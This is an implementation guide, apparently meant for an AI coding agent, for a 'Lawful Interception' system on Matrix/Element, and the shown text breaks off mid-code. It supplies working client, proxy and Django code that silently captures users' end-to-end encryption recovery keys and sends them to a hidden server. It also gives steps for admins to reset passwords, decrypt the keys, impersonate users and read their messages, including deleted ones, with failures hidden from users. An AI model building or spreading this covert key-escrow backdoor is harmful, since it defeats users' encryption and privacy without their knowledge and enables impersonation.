# Lawful Interception (LI) Requirements - Implementation Guide
## Part 1: System Architecture & Key Vault

---

## Table of Contents
1. [System Architecture](#1-system-architecture)
2. [key_vault Django Service](#2-key_vault-django-service)
3. [Encryption Strategy](#3-encryption-strategy)
4. [Synapse Authentication Proxy](#4-synapse-authentication-proxy)
5. [Client Modifications](#5-client-modifications)
6. [Hidden Instance Sync System](#6-hidden-instance-sync-system)

---

## 1. System Architecture

### 1.1 Overview

The LI system consists of two separate deployments:

```
┌─────────────────────────────────────────────────────────────┐
│                    MAIN PRODUCTION INSTANCE                  │
│                      (matrix namespace)                      │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐                         │
│  │  synapse   │───>│ PostgreSQL   │                         │
│  │  + workers │    │   Cluster    │                         │
│  └────────────┘    └──────────────┘                         │
│         │                                                     │
│         │ HTTPS (authenticated, ONLY synapse)               │
│         │                                                     │
│  ┌────────────┐    ┌────────────┐                           │
│  │ element-web│    │synapse-admin│                           │
│  └────────────┘    └────────────┘                           │
│                                                               │
└───────────────────────────────────┬─────────────────────────┘
                                    │
                                    │ HTTPS to hidden instance
                                    │ (only synapse can connect)
                                    ▼
┌─────────────────────────────────────────────────────────────┐
│                    HIDDEN LI INSTANCE                        │
│                   (Separate Server/Network)                  │
│                     (matrix-li namespace)                    │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │ synapse-li │───>│ PostgreSQL   │    │   key_vault    │  │
│  │  (replica) │    │  (replica)   │    │   (Django)     │  │
│  └────────────┘    └──────────────┘    └────────────────┘  │
│                                              ▲               │
│                                              │               │
│  ┌──────────────┐  ┌──────────────────┐    │               │
│  │element-web-li│  │synapse-admin-li  │    │               │
│  │(shows deleted│  │(sync + decrypt)  │    │               │
│  │  messages)   │  └──────────────────┘    │               │
│  └──────────────┘                           │               │
│         ▲                                    │               │
│         │          ┌────────────────┐       │               │
│         │          │ synapse-li     │───────┘               │
│         │          │ (Celery sync)  │                       │
│         │          └────────────────┘                       │
│         │                                                    │
│   Admin investigates (impersonates users)                   │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Project Naming

| Component | Main Instance | Hidden Instance | Purpose |
|-----------|---------------|-----------------|---------|
| **Synapse** | synapse | synapse-li | Matrix homeserver |
| **Element Web** | element-web | element-web-li | Web client (LI version shows deleted messages) |
| **Element X Android** | element-x-android | element-x-android | Android client |
| **Synapse Admin** | synapse-admin | synapse-admin-li | Admin panel (LI version has sync + decryption) |
| **Key Storage** | - | key_vault (Django) | Stores encrypted recovery keys |
| **Sync Service** | - | synapse-li (pg_dump/pg_restore) | Syncs main→hidden instance database |

**Network Isolation**:
- key_vault is deployed in the HIDDEN INSTANCE network (matrix-li namespace)
- From main instance, ONLY synapse (main process + workers) can connect to key_vault
- element-web, element-x-android, synapse-admin in main instance CANNOT directly access key_vault
- All key storage requests go through synapse proxy endpoint

### 1.3 Data Flow

**Normal User Flow (Main Instance)**:
1. User sets passphrase or recovery key in element-web or element-x-android
2. Client derives recovery key from passphrase (via PBKDF2-SHA-512)
3. Client verifies the recovery key was successfully set/reset/verified (no errors occurred)
4. Client encrypts recovery key with server's hardcoded public key (RSA)
5. Client sends encrypted payload to Synapse proxy endpoint
6. Synapse validates user's access token
7. Synapse proxies request to key_vault (in hidden instance network)
8. key_vault stores encrypted payload (checks hash for deduplication)

**Admin Investigation Flow (Hidden Instance)**:
1. Admin triggers database sync (via synapse-admin-li or CronJob)
2. pg_dump/pg_restore copies database from main to LI (media uses shared MinIO)
3. Admin resets target user's password in synapse-li
4. Admin retrieves user's latest encrypted recovery key from key_vault (via synapse-admin-li decrypt tab)
5. Admin decrypts key in browser using private key
6. Admin logs in as user with reset password
7. Admin enters decrypted recovery key to verify session
8. Admin sees all rooms, messages (including deleted messages with styling)

---

## 2. key_vault Django Service

### 2.1 Project Structure

Location: `/key_vault/`

```
key_vault/
├── manage.py
├── requirements.txt
├── .env.example
├── key_vault/          # Django project settings
│   ├── settings.py
│   ├── urls.py
│   ├── wsgi.py
│   └── asgi.py
└── secret/             # Django app for key storage
    ├── models.py       # User and EncryptedKey models
    ├── views.py        # StoreKeyView API endpoint
    ├── admin.py        # Django admin interface
    ├── urls.py
    └── apps.py
```

### 2.2 Database Models

**File**: `key_vault/secret/models.py`

```python
from django.db import models
from django.utils import timezone
import hashlib
import logging

logger = logging.getLogger(__name__)


class User(models.Model):
    """User record for key storage (matches Synapse username)."""
    username = models.CharField(max_length=255, unique=True, db_index=True)
    created_at = models.DateTimeField(default=timezone.now)

    class Meta:
        db_table = 'secret_user'
        indexes = [
            models.Index(fields=['username']),
        ]

    def __str__(self):
        return self.username


class EncryptedKey(models.Model):
    """
    Stores encrypted recovery key for a user.

    - Never delete records (full history preserved)
    - Deduplication via payload_hash (only latest checked)
    - Admin retrieves latest key for impersonation

    Note: We store the RECOVERY KEY (not passphrase).
    The passphrase is converted to recovery key via PBKDF2 in the client.
    The recovery key is the actual AES-256 encryption key.
    """
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='keys')
    encrypted_payload = models.TextField()  # RSA-encrypted recovery key
    payload_hash = models.CharField(max_length=64, db_index=True)  # SHA256 hash for deduplication
    created_at = models.DateTimeField(default=timezone.now, db_index=True)

    class Meta:
        db_table = 'secret_encrypted_key'
        indexes = [
            models.Index(fields=['user', '-created_at']),  # For latest key retrieval
            models.Index(fields=['payload_hash']),  # For deduplication check
        ]
        ordering = ['-created_at']  # Latest first

    def save(self, *args, **kwargs):
        # Auto-calculate hash if not provided
        if not self.payload_hash:
            self.payload_hash = hashlib.sha256(self.encrypted_payload.encode()).hexdigest()

        # LI: Log key storage for audit trail
        logger.info(
            f"LI: Storing encrypted key for user {self.user.username}, "
            f"hash={self.payload_hash[:16]}"
        )

        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.user.username} ({self.created_at})"
```

**Field Justification**:
- `username`: Identifies which user's key this is
- `encrypted_payload`: RSA-encrypted recovery key (Base64 encoded)
- `payload_hash`: SHA256 for deduplication (only check latest record)
- `created_at`: Timestamp for ordering (latest = most recent)

### 2.3 API Endpoint

**File**: `key_vault/secret/views.py`

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import User, EncryptedKey
import hashlib
import logging

logger = logging.getLogger(__name__)


class StoreKeyView(APIView):
    """
    API endpoint to store encrypted recovery key.

    Called by Synapse proxy endpoint (authenticated).
    Request format:
    {
        "username": "@user:server.com",
        "encrypted_payload": "Base64-encoded RSA-encrypted recovery key"
    }

    Deduplication logic:
    - Get latest key for this user
    - If hash matches incoming payload, skip (duplicate)
    - Otherwise, create new record (never delete old ones)
    """

    def post(self, request):
        # Extract data
        username = request.data.get('username')
        encrypted_payload = request.data.get('encrypted_payload')

        # LI: Log incoming request (audit trail)
        logger.info(f"LI: Received key storage request for user {username}")

        # Validate
        if not all([username, encrypted_payload]):
            logger.warning(f"LI: Missing required fields in request for {username}")
            return Response(
                {'error': 'Missing required fields'},
                status=status.HTTP_400_BAD_REQUEST
            )

        # Calculate hash
        payload_hash = hashlib.sha256(encrypted_payload.encode()).hexdigest()

        # Get or create user
        user, created = User.objects.get_or_create(username=username)

        if created:
            logger.info(f"LI: Created new user record for {username}")

        # Check if latest key matches (deduplication)
        latest_key = EncryptedKey.objects.filter(user=user).first()  # Ordered by -created_at

        if latest_key and latest_key.payload_hash == payload_hash:
            # Duplicate - no need to store
            logger.info(f"LI: Duplicate key for {username}, skipping storage")
            return Response({
                'status': 'skipped',
                'reason': 'Duplicate key (matches latest record)',
                'existing_key_id': latest_key.id
            }, status=status.HTTP_200_OK)

        # Create new record
        encrypted_key = EncryptedKey.objects.create(
            user=user,
            encrypted_payload=encrypted_payload,
            payload_hash=payload_hash
        )

        logger.info(
            f"LI: Successfully stored new key for {username}, "
            f"key_id={encrypted_key.id}"
        )

        return Response({
            'status': 'stored',
            'key_id': encrypted_key.id,
            'username': username,
            'created_at': encrypted_key.created_at.isoformat()
        }, status=status.HTTP_201_CREATED)
```

**File**: `key_vault/secret/urls.py`

```python
from django.urls import path
from .views import StoreKeyView

urlpatterns = [
    path('api/v1/store-key', StoreKeyView.as_view(), name='store_key'),
]
```

### 2.4 Django Admin Interface

**File**: `key_vault/secret/admin.py`

```python
from django.contrib import admin
from .models import User, EncryptedKey


@admin.register(User)
class UserAdmin(admin.ModelAdmin):
    list_display = ['username', 'created_at', 'key_count']
    search_fields = ['username']
    readonly_fields = ['created_at']

    def key_count(self, obj):
        return obj.keys.count()
    key_count.short_description = 'Number of Keys'


@admin.register(EncryptedKey)
class EncryptedKeyAdmin(admin.ModelAdmin):
    list_display = ['user', 'created_at', 'payload_hash_short']
    list_filter = ['created_at']
    search_fields = ['user__username', 'payload_hash']
    readonly_fields = ['created_at', 'payload_hash']
    ordering = ['-created_at']

    # Show first 16 chars of hash for readability
    def payload_hash_short(self, obj):
        return obj.payload_hash[:16] + '...'
    payload_hash_short.short_description = 'Payload Hash'

    # Display encrypted payload (truncated)
    def get_readonly_fields(self, request, obj=None):
        if obj:  # Editing existing
            return self.readonly_fields + ['user', 'encrypted_payload']
        return self.readonly_fields
```

---

## 3. Encryption Strategy

### 3.1 Simple RSA Public Key Encryption

**Approach**: Straightforward RSA encryption without hybrid schemes.

**Important Note**: Matrix converts passphrases to recovery keys via PBKDF2-SHA-512. The recovery key (not the passphrase) is the actual AES-256 encryption key used by Matrix. We capture and store the recovery key.

```
┌─────────────────────────────────────────────────────────┐
│         CLIENT-SIDE (element-web / element-x-android)   │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  User sets passphrase: "MySecretPass123"                │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Matrix SDK derives recovery key  │                   │
│  │ PBKDF2(passphrase, 500k iters)   │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  recoveryKey (256-bit AES key)                           │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ VERIFY: Was key successfully     │                   │
│  │ set/reset? No errors?            │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼ (ONLY if successful)                           │
│  ┌──────────────────────────────────┐                   │
│  │ Encrypt recovery key with        │                   │
│  │ hardcoded RSA public key         │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  encrypted_payload (Base64)                              │
│         │                                                 │
│         └─────────> Send to Synapse proxy endpoint       │
│                                                           │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                    SYNAPSE PROXY                         │
├─────────────────────────────────────────────────────────┤
│  Validate access token  ────────>  Forward to key_vault │
│                                    (hidden instance)     │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│           KEY_VAULT (Hidden Instance Network)            │
├─────────────────────────────────────────────────────────┤
│  Store encrypted_payload in database (no processing)    │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│          ADMIN (synapse-admin-li Decrypt Tab)            │
├─────────────────────────────────────────────────────────┤
│  Retrieve encrypted_payload from key_vault              │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Decrypt in browser with private  │                   │
│  │ key (admin enters private key)   │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  plaintext recovery key                                  │
│         │                                                 │
│         └─────────> Use to verify session in synapse-li │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### 3.2 RSA Key Pair

**Generation** (one-time, before deployment):

```bash
# Generate RSA 2048-bit key pair
openssl genrsa -out private_key.pem 2048

# Extract public key
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Display public key for hardcoding in clients
cat public_key.pem
```

**Storage**:
- **Private Key**: Admin keeps secure (out of scope)
- **Public Key**: Hardcoded in client configurations (element-web, element-x-android)

**No Key Rotation**: Single keypair used permanently.

### 3.3 Client-Side Encryption (element-web)

**File**: `element-web/src/utils/LIEncryption.ts` (NEW FILE)

```typescript
/**
 * LI encryption utilities for encrypting recovery keys
 * before sending to server.
 */

import { JSEncrypt } from 'jsencrypt';

// Hardcoded RSA public key (2048-bit)
// IMPORTANT: Replace with your actual public key
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key here)
-----END PUBLIC KEY-----`;

/**
 * Encrypt recovery key with RSA public key.
 *
 * @param plaintext - The recovery key to encrypt
 * @returns Base64-encoded encrypted payload
 */
export function encryptKey(plaintext: string): string {
    const encrypt = new JSEncrypt();
    encrypt.setPublicKey(RSA_PUBLIC_KEY);

    const encrypted = encrypt.encrypt(plaintext);
    if (!encrypted) {
        throw new Error('Encryption failed');
    }

    return encrypted;  // Already Base64-encoded by JSEncrypt
}
```

**Dependencies**: Add `jsencrypt` to element-web's package.json:

```json
{
  "dependencies": {
    "jsencrypt": "^3.3.2"
  }
}
```

### 3.4 Client-Side Encryption (element-x-android)

**File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIEncryption.kt` (NEW FILE)

```kotlin
package io.element.android.libraries.matrix.impl.li

import android.util.Base64
import java.security.KeyFactory
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher

/**
 * LI encryption utilities for Android.
 */
object LIEncryption {

    // Hardcoded RSA public key (same as element-web)
    private const val RSA_PUBLIC_KEY_PEM = """
        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key)
        -----END PUBLIC KEY-----
    """.trimIndent()

    /**
     * Encrypt recovery key with RSA public key.
     *
     * @param plaintext The recovery key to encrypt
     * @return Base64-encoded encrypted payload
     */
    fun encryptKey(plaintext: String): String {
        // Parse PEM public key
        val publicKeyPEM = RSA_PUBLIC_KEY_PEM
            .replace("-----BEGIN PUBLIC KEY-----", "")
            .replace("-----END PUBLIC KEY-----", "")
            .replace("\\s".toRegex(), "")

        val publicKeyBytes = Base64.decode(publicKeyPEM, Base64.DEFAULT)
        val keySpec = X509EncodedKeySpec(publicKeyBytes)
        val keyFactory = KeyFactory.getInstance("RSA")
        val publicKey = keyFactory.generatePublic(keySpec)

        // Encrypt
        val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
        cipher.init(Cipher.ENCRYPT_MODE, publicKey)
        val encryptedBytes = cipher.doFinal(plaintext.toByteArray())

        return Base64.encodeToString(encryptedBytes, Base64.NO_WRAP)
    }
}
```

---

## 4. Synapse Authentication Proxy

### 4.1 Purpose

Synapse validates user's access token before forwarding key storage request to key_vault. This ensures:
- Only authenticated users can store keys
- Audit trail (Synapse logs the request)
- No direct client → key_vault access (security)
- Network isolation (only Synapse can reach hidden instance)

### 4.2 Implementation

**File**: `synapse/synapse/rest/client/li_proxy.py` (NEW FILE)

```python
"""
LI Proxy Endpoint for Key Vault

Proxies encrypted key storage requests to key_vault Django service.
Authentication handled by Synapse (access token validation).
"""

import logging
import aiohttp
from typing import TYPE_CHECKING, Tuple

from synapse.http.server import DirectServeJsonResource
from synapse.http.servlet import parse_json_object_from_request, RestServlet
from synapse.types import JsonDict

if TYPE_CHECKING:
    from synapse.server import HomeServer

logger = logging.getLogger(__name__)


class LIProxyServlet(RestServlet):
    """
    Proxy endpoint: POST /_synapse/client/v1/li/store_key

    Validates user auth, then forwards to key_vault.
    """

    PATTERNS = ["/li/store_key$"]

    def __init__(self, hs: "HomeServer"):
        super().__init__()
        self.hs = hs
        self.auth = hs.get_auth()
        self.key_vault_url = hs.config.li.key_vault_url  # From homeserver.yaml

    async def on_POST(self, request) -> Tuple[int, JsonDict]:
        # LI: Validate user authentication
        requester = await self.auth.get_user_by_req(request)
        user_id = requester.user.to_string()

        # LI: Log for audit trail
        logger.info(f"LI: Key storage request from user {user_id}")

        # Parse request body
        body = parse_json_object_from_request(request)

        # Ensure username matches authenticated user (security check)
        if body.get('username') != user_id:
            logger.warning(
                f"LI: Username mismatch - authenticated: {user_id}, "
                f"provided: {body.get('username')}"
            )
            return 403, {"error": "Username mismatch"}

        # LI: Forward to key_vault
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.key_vault_url}/api/v1/store-key",
                    json=body,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    response_data = await resp.json()

                    # LI: Log result
                    if resp.status in [200, 201]:
                        logger.info(
                            f"LI: Key successfully stored for {user_id}, "
                            f"status={response_data.get('status')}"
                        )
                    else:
                        logger.error(
                            f"LI: Key storage failed for {user_id}, "
                            f"status={resp.status}"
                        )

                    return resp.status, response_data
        except Exception as e:
            logger.error(f"LI: Failed to forward to key_vault for {user_id}: {e}")
            return 500, {"error": "Failed to store key"}


def register_servlets(hs: "HomeServer", http_server: DirectServeJsonResource) -> None:
    """Register LI proxy servlet."""
    LIProxyServlet(hs).register(http_server)
```

**File**: `synapse/synapse/app/_base.py` (MODIFICATION)

```python
# LI: Import and register LI proxy servlet
from synapse.rest.client import li_proxy

# In _configure_named_resource() function, add:
# LI: Register LI proxy endpoints
if self.config.li.enabled:
    li_proxy.register_servlets(self, resource)
```

**File**: `synapse/synapse/config/li.py` (NEW FILE)

```python
"""
LI configuration for Synapse.
"""

from typing import Any
from synapse.config._base import Config


class LIConfig(Config):
    """LI-specific configuration."""

    section = "li"

    def read_config(self, config: dict, **kwargs: Any) -> None:
        li_config = config.get("li") or {}

        self.enabled = li_config.get("enabled", False)
        self.key_vault_url = li_config.get(
            "key_vault_url",
            "http://key-vault.matrix-li.svc.cluster.local:8000"
        )

    def generate_config_section(self, **kwargs: Any) -> str:
        return """\
        # Lawful Interception Configuration
        li:
          # Enable LI proxy endpoints
          enabled: false

          # key_vault Django service URL (hidden instance network)
          # Only main Synapse can access this URL
          key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
        """
```

**File**: `synapse/synapse/config/homeserver.py` (MODIFICATION)

```python
# LI: Add LI config
from synapse.config.li import LIConfig

# In ConfigBuilder class:
class HomeServerConfig(RootConfig):
    config_classes = [
        # ... existing configs ...
        LIConfig,  # LI: Add LI config
    ]
```

**Configuration** (`homeserver.yaml` for main instance):

```yaml
# LI: Lawful Interception
li:
  enabled: true
  key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
```

---

## 5. Client Modifications

### 5.1 element-web Changes

**Objective**: Send encrypted recovery key to Synapse proxy endpoint whenever user successfully sets, resets, or verifies their key.

**CRITICAL**: Only send request if the recovery key operation was successful (no errors).

**Retry logic**: 5 attempts, 10 second interval, 30 second timeout per request

#### Integration Point: Recovery Key Generation

**File**: `element-web/src/stores/LIKeyCapture.ts` (NEW FILE)

```typescript
/**
 * LI Key Capture Module
 *
 * Sends encrypted recovery keys to Synapse LI proxy endpoint.
 * CRITICAL: Only sends if key operation was successful (no errors).
 * Retry logic: 5 attempts, 10 second interval, 30 second timeout.
 */

import { MatrixClient } from "matrix-js-sdk";
import { encryptKey } from "../utils/LIEncryption";

const MAX_RETRIES = 5;
const RETRY_INTERVAL_MS = 10000;  // 10 seconds
const REQUEST_TIMEOUT_MS = 30000;  // 30 seconds

export interface KeyCaptureOptions {
    client: MatrixClient;
    recoveryKey: string;  // The actual recovery key (not passphrase)
}

/**
 * Send encrypted recovery key to LI endpoint with retry logic.
 *
 * IMPORTANT: Only call this function AFTER verifying the recovery key
 * operation (set/reset/verify) was successful with no errors.
 */
export async function captureKey(options: KeyCaptureOptions): Promise<void> {
    const { client, recoveryKey } = options;

    // Encrypt recovery key
    const encryptedPayload = encryptKey(recoveryKey);
    const username = client.getUserId()!;

    // Retry loop
    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            const response = await fetch(
                `${client.getHomeserverUrl()}/_synapse/client/v1/li/store_key`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${client.getAccessToken()}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username,
                        encrypted_payload: encryptedPayload,
                    }),
                    signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
                }
            );

            if (response.ok) {
                console.log(`LI: Key captured successfully (attempt ${attempt})`);
                return;  // Success
            } else {
                console.warn(`LI: Key capture failed with HTTP ${response.status} (attempt ${attempt})`);
            }
        } catch (error) {
            console.error(`LI: Key capture error (attempt ${attempt}):`, error);
        }

        // Wait before retry (unless last attempt)
        if (attempt < MAX_RETRIES) {
            await new Promise(resolve => setTimeout(resolve, RETRY_INTERVAL_MS));
        }
    }

    // All retries exhausted
    console.error(`LI: Failed to capture key after ${MAX_RETRIES} attempts. Giving up.`);
}
```

**File**: `element-web/src/async-components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)

```typescript
// LI: Import key capture
import { captureKey } from "../../../../stores/LIKeyCapture";

// In _doBootstrapUIAuth() or wherever recovery key is generated:
async function onRecoveryKeyGenerated(recoveryKey: GeneratedSecretStorageKey) {
    // ... existing setup logic ...

    // Verify setup was successful (no errors thrown)
    const setupSuccessful = true;  // Based on existing error handling

    // LI: Capture recovery key ONLY if setup was successful
    if (setupSuccessful) {
        captureKey({
            client: MatrixClientPeg.get(),
            recoveryKey: recoveryKey.encodedPrivateKey,
        }).catch(err => {
            // Silent failure - don't disrupt user experience
            console.error('LI: Key capture failed:', err);
        });
    }

    // ... continue with normal flow ...
}
```

**Comment Style**:
```typescript
// LI: <brief description of what this does>
```

All LI-related code changes marked with `// LI:` prefix for easy identification during upstream merges.

### 5.2 element-x-android Changes

**Objective**: Same as element-web - capture recovery keys when successfully generated.

**File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIKeyCapture.kt` (NEW FILE)

```kotlin
package io.element.android.libraries.matrix.impl.li

import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeout
import okhttp3.OkHttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import timber.log.Timber

/**
 * LI Key Capture for Android
 *
 * Encrypts and sends recovery keys to Synapse LI endpoint.
 * CRITICAL: Only call after verifying key operation was successful.
 */
object LIKeyCapture {

    private const val MAX_RETRIES = 5
    private const val RETRY_INTERVAL_MS = 10_000L  // 10 seconds
    private const val REQUEST_TIMEOUT_MS = 30_000L  // 30 seconds

    /**
     * Send encrypted recovery key to LI endpoint with retry logic.
     *
     * IMPORTANT: Only call AFTER verifying the recovery key operation
     * (set/reset/verify) was successful with no errors.
     */
    suspend fun captureKey(
        homeserverUrl: String,
        accessToken: String,
        username: String,
        recoveryKey: String
    ) {
        val encryptedPayload = LIEncryption.encryptKey(recoveryKey)

        val client = OkHttpClient()

        // Retry loop
        for (attempt in 1..MAX_RETRIES) {
            try {
                withTimeout(REQUEST_TIMEOUT_MS) {
                    val json = JSONObject().apply {
                        put("username", username)
                        put("encrypted_payload", encryptedPayload)
                    }

                    val request = Request.Builder()
                        .url("$homeserverUrl/_synapse/client/v1/li/store_key")
                        .addHeader("Authorization", "Bearer $accessToken")
                        .post(json.toString().toRequestBody("application/json".toMediaType()))
                        .build()

                    val response = client.newCall(request).execute()

                    if (response.isSuccessful) {
                        Timber.d("LI: Key captured successfully (attempt $attempt)")
                        return  // Success
                    } else {
                        Timber.w("LI: Key capture failed with HTTP ${response.code} (attempt $attempt)")
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture error (attempt $attempt)")
            }

            // Wait before retry
            if (attempt < MAX_RETRIES) {
                delay(RETRY_INTERVAL_MS)
            }
        }

        // All retries exhausted
        Timber.e("LI: Failed to capture key after $MAX_RETRIES attempts. Giving up.")
    }
}
```

**File**: `element-x-android/features/securebackup/impl/src/main/kotlin/io/element/android/features/securebackup/impl/setup/SecureBackupSetupPresenter.kt` (MODIFICATION)

```kotlin
// LI: Import key capture
import io.element.android.libraries.matrix.impl.li.LIKeyCapture
import kotlinx.coroutines.launch

// In createRecovery() function:
private suspend fun createRecovery(): Result<RecoveryKey> {
    val result = encryptionService.enableRecovery(...)

    result.onSuccess { recoveryKey ->
        // LI: Capture recovery key ONLY on success (coroutine launch - don't block)
        coroutineScope.launch {
            try {
                LIKeyCapture.captureKey(
                    homeserverUrl = sessionRepository.getHomeserverUrl(),
                    accessToken = sessionRepository.getAccessToken(),
                    username = sessionRepository.getUserId(),
                    recoveryKey = recoveryKey.value  // The actual recovery key
                )
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture failed")
            }
        }
    }

    return result
}
```

---

## 6. Hidden Instance Sync System

### 6.1 Architecture

The hidden instance (synapse-li, element-web-li, synapse-admin-li, key_vault) must stay in sync with the main instance. Sync is:
- **One-way**: Main → Hidden (changes in hidden instance do NOT affect main)
- **Full replacement**: Each sync completely overwrites the LI database
- **On-demand**: Triggered by admin clicking sync button in synapse-admin-li
- **Scheduled**: Automatic sync via Kubernetes CronJob (configurable interval)
- **Locked**: File-based lock prevents concurrent syncs
- **Robust**: Failed syncs don't break future syncs

### 6.2 Sync Strategy (Based on CLAUDE.md Requirements)

Per CLAUDE.md section 3.3 and 7.2:
- **Database**: pg_dump/pg_restore for full database synchronization
- **Media**: LI uses shared main MinIO directly (no media sync needed)

**Key Points**:
- Each sync **completely overwrites** the LI database with a fresh copy from main
- Any changes made in LI (such as password resets) are **lost after the next sync**
- LI uses the **same MinIO bucket** as main for media (read-only access in practice)
- Sync interval is configurable via Kubernetes CronJob

### 6.3 Sync Checkpoint Tracking (File-Based)

**Important**: To avoid Synapse database migrations, we use file-based checkpoint storage instead of Django models.

**File**: `synapse-li/sync/checkpoint.py`

```python
"""
File-based sync checkpoint tracking for pg_dump/pg_restore synchronization.

Uses JSON file to track sync progress and statistics.
"""

import json
import logging
from pathlib import Path
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)

CHECKPOINT_FILE = Path('/var/lib/synapse-li/sync_checkpoint.json')


class SyncCheckpoint:
    """Tracks sync progress and statistics using JSON file."""

    def __init__(self):
        self.file_path = CHECKPOINT_FILE
        self.file_path.parent.mkdir(parents=True, exist_ok=True)

        if not self.file_path.exists():
            self._initialize()

    def _initialize(self):
        """Create initial checkpoint file."""
        initial_data = {
            'last_sync_at': None,
            'last_sync_status': 'never',
            'last_dump_size_mb': None,
            'last_duration_seconds': None,
            'last_error': None,
            'total_syncs': 0,
            'failed_syncs': 0,
            'created_at': datetime.now().isoformat()
        }
        self._write(initial_data)
        logger.info("LI: Initialized sync checkpoint file")

    def _read(self) -> dict:
        """Read checkpoint from file."""
        try:
            with open(self.file_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"LI: Failed to read checkpoint file: {e}")
            raise

    def _write(self, data: dict):
        """Write checkpoint to file atomically."""
        try:
            # Write to temp file first, then atomic rename
            temp_file = self.file_path.with_suffix('.tmp')
            with open(temp_file, 'w') as f:
                json.dump(data, f, indent=2)
            temp_file.replace(self.file_path)

            logger.debug("LI: Updated checkpoint file")
        except Exception as e:
            logger.error(f"LI: Failed to write checkpoint file: {e}")
            raise

    def get_checkpoint(self) -> dict:
        """Get current checkpoint data."""
        return self._read()

    def update_checkpoint(self, dump_size_mb: float, duration_seconds: float):
        """Update checkpoint after successful sync."""
        data = self._read()
        data['last_sync_at'] = datetime.now().isoformat()
        data['last_sync_status'] = 'success'
        data['last_dump_size_mb'] = dump_size_mb
        data['last_duration_seconds'] = duration_seconds
        data['last_error'] = None
        data['total_syncs'] += 1
        self._write(data)

        logger.info(
            f"LI: Sync checkpoint updated - "
            f"dump size: {dump_size_mb:.2f} MB, "
            f"duration: {duration_seconds:.1f}s, "
            f"total syncs: {data['total_syncs']}"
        )

    def mark_failed(self, error_message: str = None):
        """Mark sync as failed."""
        data = self._read()
        data['last_sync_status'] = 'failed'
        data['last_error'] = error_message
        data['failed_syncs'] += 1
        self._write(data)

        logger.warning(
            f"LI: Sync marked as failed - "
            f"error: {error_message}, "
            f"total failures: {data['failed_syncs']}"
        )
```

### 6.4 Sync Lock Mechanism

**Purpose**: Ensure only ONE sync process runs at a time.

**File**: `synapse-li/sync/lock.py` (NEW FILE)

```python
"""
File-based lock for sync process.

Uses file locking to prevent concurrent syncs.
"""

import fcntl
import logging
from pathlib import Path
from contextlib import contextmanager

logger = logging.getLogger(__name__)

LOCK_FILE = Path('/var/lib/synapse-li/sync.lock')


class SyncLock:
    """File-based lock for sync process."""

    def __init__(self):
        self.lock_file = LOCK_FILE
        self.lock_file.parent.mkdir(parents=True, exist_ok=True)
        self.lock_fd = None

    def acquire(self, timeout: int = 0) -> bool:
        """
        Acquire lock for sync process.

        Returns True if lock acquired, False if already locked.
        """
        try:
            self.lock_fd = open(self.lock_file, 'w')
            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            logger.info("LI: Sync lock acquired")
            return True
        except IOError:
            logger.warning("LI: Sync already in progress (lock held)")
            return False

    def release(self):
        """Release lock."""
        if self.lock_fd:
            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_UN)
            self.lock_fd.close()
            self.lock_fd = None
            logger.info("LI: Sync lock released")

    def is_locked(self) -> bool:
        """Check if lock is currently held."""
        try:
            fd = open(self.lock_file, 'w')
            fcntl.flock(fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            fcntl.flock(fd.fileno(), fcntl.LOCK_UN)
            fd.close()
            return False
        except IOError:
            return True

    @contextmanager
    def lock(self):
        """Context manager for lock acquisition."""
        if not self.acquire():
